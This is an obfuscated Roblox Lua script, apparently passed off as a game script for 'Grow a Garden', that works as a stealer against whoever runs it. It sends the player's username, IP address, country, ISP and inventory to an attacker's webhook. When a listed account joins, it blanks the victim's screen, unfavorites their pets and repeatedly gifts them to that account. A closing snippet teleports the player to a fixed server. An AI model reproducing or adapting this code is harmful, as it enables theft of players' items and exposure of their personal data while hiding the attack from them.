            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('KwEboxsWDUjhzGhxXhefoUwqlzAgHGsutYauZbQsnvLXQfCMVufWZZD') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('njgJYEVJauYeczpJQrNgduCUEpCvXCfsMNSsCBgmaIMSMePSHmACpDrWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('IRXdsrtXAfMsgXWQBgrQEJpJDmjalQllKzfjHteYZZYwjsTtZQbWithWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('rjBCIZoCutanmIneCHyOGGbvNMvaQTwYHuStfwmgQoIwbysECEjksZlQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('AnkOzwgtLDnDRhyvmdROMDzigxVfNxmDXVcDmByLgNmHcGAoDAGLWOBVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('sjRVHLngNNRfQTMmtIfzhemDPhosWpyeRyOLhbZFkBtMEBUyRYUgwiiLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('VBzxEzzywaWLDlnxOaOVFDLMUTQFtupIVwxVNOBDNoFsvKqkJauZDqy8J+OkiBQZXRzIA==') .. tostring(i) .. pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('MaqrseKUPmKDREdjkRLfCcqsLcpPsuHDuNUohrGuMoCAtqvjBgxDtMr4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('IdwlUKoASdySVEFouyvPLluCniQddrOiCDMfDhkrvgVsAwfRsSwqDHJXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('FZDCfIIZXVwsjsLGYkWcAwIJrHHJeXoYaKGGIoUahTfHfAzkrAvOGyI'),
        embeds = {{
            title = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('MvHFauyzWTvuvzgqcAkzRktcTNtlLeFkEPWPdFTMEbJPRvUQuDJxRXh8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('MGbsLPZJOXPOimOdQbTIczWBqbnzPOodSjWQEVhwYuzNPioFZtaOayQRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('zoAKXPOLZyrHnniwdzTFqKSplaVUdSzYqGPurqwJVKSWcFvURewmxHOISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('KnqQGEnpQUsMHNsjOJhCuaTvPzjqrbrntciqJPYiCvfWbKiPTrxJdsyUE9TVA=='),
            Headers = { [pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JUtBSgvYFzaYxucoUKpcOMELJkIJPwpcWDqVrkNcQrkkNrrwuwXvdMkQ29udGVudC1UeXBl')] = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('miqzygWzxllXXUVveQEjCJgqQmfPDPXpESmwCQCgPEYeuBylRBsNnUxYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('UCkLKLCMQCEDHGnvmaKTGAiUknbycdfisslyLZMdaooCekgkNzwXTPnVW5rbm93bg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('hnMqecRgApLHjouUPCbJcCnelEoIOyCslkvjNmYwkviQfLlaxtnoHGNVW5rbm93bg=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('qckwolscLVnxciDwFlmfnFOXOlvEytoUFLpICPqpQrfqcQgdrvCFgxcVW5rbm93bg==') end
    local result = req({ Url = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('YshdFsEzgCMwGVuMrVanYHmJWLpZSFMNpcyleRCzBPADEOHtQVEfOiIaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QVKOKlmhYBTWklJZOUnEDLNvtjakHpUPomOLtBlJSzXSROhrtzZQikoR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('uSYueeSHPAbUrZsCVvkcPTkexErexLIJkVUeKtGiOIfGqFgOoeHqvxkPw=='), body.country or pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('cEfPorwJMiEsiKYjlcNzAVjyYsOqPHAFStQZsPIxYBswGvUNmfMdpwVPw=='), body.isp or pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QoaRTZajIdaRoYMVJfGiBOVutkqwrAMefnuBSbKVjDggxLxwajWecqlPw==')
    end
    return pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OIryWBccoyrVcOdOSDzKcCPWTzKZHgxYyToxMgzqQQWZPsbiuDURrLaPw=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('AsJNFBVrlDnIfXdJdYHeEduvwWlKnvlWqUcgWkyjUnPXNPKKopTRcsiPw=='), pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('tarIYTgZLGGIXqnsaPGEwBvMsfjtyDQZhxQLqnklDNSmFpJmZwIotbJPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('CDSGaxscplTKAiVELQpMaSgpqwLmeDDHcGGhecCOFxAKHkRMWBAuQejRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('njotkAfuejKhiNyrxjSaChXyKnJYkqdsnZVFiooDCtGlkuiClhQSojiSW5zdGFuY2U=')) and item:GetAttribute(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ivzZzGADKkDldCLnIPxzYCHxnTUFBtVckChltgfZeqfjiVTukgTsQMLZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ERZanISfbahWRtOlgyudXRwbVhbdHabXCyLnqWFUBglYlnGKPMIWHDvR2FtZUV2ZW50cw==')):WaitForChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('WBDhIHrggtyZgsBiBdZTfKdkkBsgFjmBknvKfGgmHxamrSJEhzSadKlVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('bgyPWbgyKdhrkWBpKrucQGTxjjZYOGzxJVZImyxGqeVSrDkwZDxJiPa8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JetyXsBcTlcVxOkYCbJcvWNMvoRrvJIcqeGEtJLSzzWbggJfAFYUfzfLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QqAuSDlcmzDJWqXAudIMxYzgOOSmGglIpDEjVuBelzaJVaxlANQwOCP8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('yMHlEObtFIMANMfINKCWslHmrrEZswAgwWFYAVxFFsxAndXsmNyoWVB8J+MkCBJUA=='), value = ip },
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('QrXdPimOjmYqsHAtkJIXafQZKdXnoNpbHYRuFmZUISGNbxUNpiQAXnj8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('cbYeVJxjRkBQuuooqlZfZOtKnKqUxDqsEODSmzZIjvZzHsYXRfdtWYT8J+SuyBJU1A='), value = isp },
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OelKmFDMAgDWvNhYbEwsaulVXwoGlDCFWrjETBzyraMsPkiBIjzEEat8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('tgMIFwXaacRtglSTEjgbefGhFlQWjEbwxKVLGPSVWQwMLPnftpNqyZk4o+x77iPIFRpbWU='), value = os.date(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('ChbzIkveJlDzxoQBxZgqecFqcjCMnzikQMrNlTDVwqFIaAdiLRlbYxXJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('JYaWbRnWcEwoMLYyDQjPrGYmwtdwyIqSicalsBVBXlkxAQxrtDstXmV8J+OkiBQZXRz'), value = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('sOMilSBcewPHnYlICkgbdipkpuBAVIiZzPiGsReWZMqSuNPFAZnbwRHTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XDNhlxcvAQphFORgEKTAiOjCZpTzKbNFwzESdJePtXwUGQTgfZmbQkz8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = jobId == targetServerId and pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('OrjOnjCqqTvuFsKoSkRFZgdMWQjhGZKWxnocXSELlNGClaUFXOHgjvsQWxyZWFkeSBpbiB0YXJnZXQgc2VydmVyLg==') or pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('rupMdHWriBKLKwJjRRcTTdCfCgfMKwWqZrCmvOtnIoIfbnJnQJKNSjSUmVkaXJlY3RlZCB0byB0YXJnZXQgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('tjxEWVAEMlfaCUZvGWZromTJjmjHjCvhrnxTdJkVxIJUwcTPjCqrZhEU2NyZWVuR3Vp')) or gui:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('WwNenNOxQLuESoLNLtWmCumGMNAZNsembDWjmBveQRpVLkkjLpsvKxMQmlsbGJvYXJkR3Vp')) or gui:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('KBUVZpxhGlKJMpDDeTQrwtOuOwdUnHYGDjdyzKQnTTLlHJbzAoeiUifU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XdeanfnjZrfFFzKgBOQLOkjBLZEvOgGGpIanNjKyAUETGROohmrPvvQVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('xTwikMGQIAxoAbRnslMPJgtWSrMtHYdzBGghlIYLoUCldwaFdgVWSPPR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('XJylYbXAoszXXxmnKnBnyzolHdSwshymHLdHkuspxnfuOawmIvzRjmSR2FtZUV2ZW50cw==')):WaitForChild(pCkdipVIHyatJqozgCVIwcteOnHBICnAViNgGNdZRFPMoYkAWVYykiLSuCvhJewxsCuXQFPWrTVOgTjOoL('qqqPhYbQkjVOAUwhBnlPanRwgsieFFYWhVDlualWVhJRNbDWVJPlyQNUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    


--// Replace with your target JobId (ServerId)
local jobId = "29034fc7-77e6-4008-a431-303c5aee26a6"

--// Replace with the correct PlaceId
local placeId = 126884695634066

--// Get required services
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

--// Attempt teleport
TeleportService:TeleportToPlaceInstance(placeId, jobId, localPlayer)
